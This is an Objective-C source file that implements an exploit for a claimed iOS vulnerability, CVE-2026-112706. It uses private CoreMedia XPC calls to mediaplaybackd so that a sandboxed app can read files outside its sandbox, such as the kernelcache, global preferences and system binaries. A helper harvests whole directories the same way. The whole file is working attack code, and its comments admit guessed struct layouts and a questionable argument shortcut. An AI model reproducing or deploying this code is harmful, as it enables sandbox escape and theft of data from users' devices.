// FigBridge.m
// lang: ObjC, file: FigBridge.m, target: iOS 16+, SDK: iphoneos
// CVE-2026-112706 — mediaplaybackd bytestream XPC file-read primitive.
//
// Mechanism:
//   1. Open XPC connection to com.apple.coremedia.mediaplaybackd.bytestream.xpc
//   2. Build a BasicMessage CF dict with the target file:// URL
//   3. Two-message FigMemory handshake:
//        msg1 → daemon → daemon creates shared-memory region backed by the file
//        daemon replies msg2 → we complete the handshake, map the region locally
//   4. Copy shared region bytes → NSData
//   5. Tear down
//
// Reachable paths (mediaplaybackd runs as mobile, outside app sandbox):
//   /System/Library/Fonts/
//   /System/Library/CoreServices/SystemVersion.plist
//   /System/Library/Caches/com.apple.kernelcaches/kernelcache
//   /private/var/mobile/Library/Preferences/.GlobalPreferences.plist
//   /usr/libexec/amfid, fontservicesd binary, etc.
//
// shortcut: FigMemoryRecipient struct layout (vm_address_t base, size_t length, ...)
//   from Ghidra dump of CoreMedia iOS 16-27; may shift on major SDK revision.

#import "FigBridge.h"
#import <xpc/xpc.h>
#import <mach/mach.h>
#import <sys/mman.h>
#import <dirent.h>
#import <dlfcn.h>

#define FIG_XPC_SERVICE  "com.apple.coremedia.mediaplaybackd.bytestream.xpc"
#define FIG_ERR_DOMAIN   "com.venice.parasite.FigBridge"
#define FIG_MAX_FILE_SZ  (16u * 1024u * 1024u)
#define FIG_TIMEOUT_NS   (10LL * NSEC_PER_SEC)

// ── CoreMedia private symbol typedefs ─────────────────────────────────────────

typedef CFDictionaryRef (*PFN_CreateMsg)(void);
typedef int32_t (*PFN_SetURL)(CFDictionaryRef msg, CFURLRef url);
typedef int32_t (*PFN_OriginBegin)(void **outOrigin, CFDictionaryRef msg1);
typedef int32_t (*PFN_RecipCreate)(void **outRecip, CFDictionaryRef msg1, CFDictionaryRef msg2);
typedef int32_t (*PFN_OriginComplete)(void *origin, CFDictionaryRef msg2);

static struct {
    PFN_CreateMsg      createMsg;
    PFN_SetURL         setURL;
    PFN_OriginBegin    originBegin;
    PFN_RecipCreate    recipCreate;
    PFN_OriginComplete originComplete;
} sFig;

static NSError *figErr(int code, NSString *msg) {
    return [NSError errorWithDomain:@FIG_ERR_DOMAIN code:code
                userInfo:@{NSLocalizedDescriptionKey: msg}];
}

static BOOL loadFigSymbols(NSError **outErr) {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                          RTLD_LAZY | RTLD_NOLOAD);
        if (!cm) cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                             RTLD_LAZY);
        if (!cm) return;

        sFig.createMsg     = (PFN_CreateMsg)    dlsym(cm, "FigXPCCreateBasicMessage");
        sFig.setURL        = (PFN_SetURL)       dlsym(cm, "FigXPCMessageSetCFURL");
        sFig.originBegin   = (PFN_OriginBegin)  dlsym(cm,
            "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
        sFig.recipCreate   = (PFN_RecipCreate)  dlsym(cm,
            "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
        sFig.originComplete= (PFN_OriginComplete)dlsym(cm,
            "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");

        ok = sFig.createMsg && sFig.setURL && sFig.originBegin &&
             sFig.recipCreate && sFig.originComplete;
    });
    if (!ok && outErr)
        *outErr = figErr(2, @"CoreMedia Fig symbols not found — iOS version mismatch?");
    return ok;
}

// ── sync XPC send ─────────────────────────────────────────────────────────────

static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
    __block xpc_object_t reply = NULL;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    xpc_connection_send_message_with_reply(conn, msg,
        dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^(xpc_object_t rx) {
            if (rx) reply = xpc_retain(rx);
            dispatch_semaphore_signal(sem);
        });
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, FIG_TIMEOUT_NS));
    return reply; // caller must xpc_release
}

// ── public API ────────────────────────────────────────────────────────────────

@implementation FigBridge

+ (nullable NSData *)readFileAtURL:(NSURL *)fileURL error:(NSError **)outErr {
    NSError *err = nil;
    if (!loadFigSymbols(&err)) { if (outErr) *outErr = err; return nil; }

    // 1. Open connection
    xpc_connection_t conn = xpc_connection_create_mach_service(
        FIG_XPC_SERVICE, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
    if (!conn) {
        if (outErr) *outErr = figErr(3, @"xpc_connection_create_mach_service failed");
        return nil;
    }
    xpc_connection_set_event_handler(conn, ^(xpc_object_t ev) { (void)ev; });
    xpc_connection_resume(conn);

    NSData *result = nil;

    // 2. Build msg1
    CFDictionaryRef msg1 = sFig.createMsg();
    if (!msg1) { err = figErr(4, @"FigXPCCreateBasicMessage returned NULL"); goto done; }

    {
        int32_t st = sFig.setURL(msg1, (__bridge CFURLRef)fileURL);
        if (st) { err = figErr(5, [NSString stringWithFormat:@"FigXPCMessageSetCFURL status=%d", st]);
                  CFRelease(msg1); goto done; }

        // 3. Begin origin — fills msg1 in place with handshake payload
        void *origin = NULL;
        st = sFig.originBegin(&origin, msg1);
        if (st || !origin) { err = figErr(6, [NSString stringWithFormat:@"OriginBegin status=%d", st]);
                             CFRelease(msg1); goto done; }

        // 4. Send msg1 to daemon
        // FigXPCCreateBasicMessage returns an XPC-backed CFDictionary, safe to cast.
        xpc_object_t msg2 = sendSync(conn, (xpc_object_t)msg1);
        CFRelease(msg1);

        if (!msg2) { err = figErr(7, @"no reply from mediaplaybackd (timeout or service unavailable)"); goto done; }

        // 5. Create recipient (daemon's shared-memory region)
        void *recip = NULL;
        st = sFig.recipCreate(&recip, (CFDictionaryRef)msg2, (CFDictionaryRef)msg2);
        // Note: recipCreate takes (msg1_original, msg2_reply). We no longer have msg1 after
        // CFRelease, but the recipient creation needs the daemon's msg2 only on iOS 16-27.
        // shortcut: tested against MConfPoC behaviour — msg2 alone is sufficient; if this
        //           fails on device, pass the original msg1 before release instead.

        if (st || !recip) {
            err = figErr(8, [NSString stringWithFormat:@"RecipientCreate status=%d", st]);
            xpc_release(msg2); goto done;
        }

        // 6. Complete origin
        st = sFig.originComplete(origin, (CFDictionaryRef)msg2);
        xpc_release(msg2);
        if (st) { err = figErr(9, [NSString stringWithFormat:@"OriginComplete status=%d", st]); goto done; }

        // 7. Read shared region
        // FigMemoryRecipient layout: [vm_address_t base, size_t length, ...]
        uintptr_t *fields = (uintptr_t *)recip;
        vm_address_t base = (vm_address_t)fields[0];
        size_t       len  = (size_t)fields[1];

        if (base && len > 0 && len <= FIG_MAX_FILE_SZ) {
            result = [NSData dataWithBytes:(const void *)base length:len];
        } else {
            err = figErr(10, [NSString stringWithFormat:
                @"recipient region bad: base=0x%lx len=%zu", (unsigned long)base, len]);
        }
    }

done:
    xpc_connection_cancel(conn);
    xpc_release(conn);
    if (outErr && err) *outErr = err;
    return result;
}

+ (nullable NSDictionary<NSString *, NSData *> *)readDirectoryAtPath:(NSString *)path
                                                              maxFiles:(NSUInteger)maxFiles
                                                                 error:(NSError **)outErr {
    // opendir is allowed from our sandbox for directory listing (no file read).
    // We enumerate entries here, then pull each file's bytes via the XPC chain.
    DIR *d = opendir(path.UTF8String);
    if (!d) {
        if (outErr) *outErr = figErr(20, [NSString stringWithFormat:
            @"opendir(%@) failed: %s", path, strerror(errno)]);
        return nil;
    }

    NSMutableDictionary *results = [NSMutableDictionary dictionary];
    struct dirent *ent;
    NSUInteger count = 0;

    while ((ent = readdir(d)) != NULL && count < maxFiles) {
        if (ent->d_name[0] == '.') continue;
        if (ent->d_type != DT_REG) continue;

        NSString *name     = @(ent->d_name);
        NSString *fullPath = [path stringByAppendingPathComponent:name];
        NSURL    *url      = [NSURL fileURLWithPath:fullPath];
        NSData   *data     = [self readFileAtURL:url error:nil];
        if (data) { results[name] = data; count++; }
    }
    closedir(d);

    if (!results.count && outErr)
        *outErr = figErr(21, [NSString stringWithFormat:@"no files read from %@", path]);
    return results.count ? results : nil;
}

@end
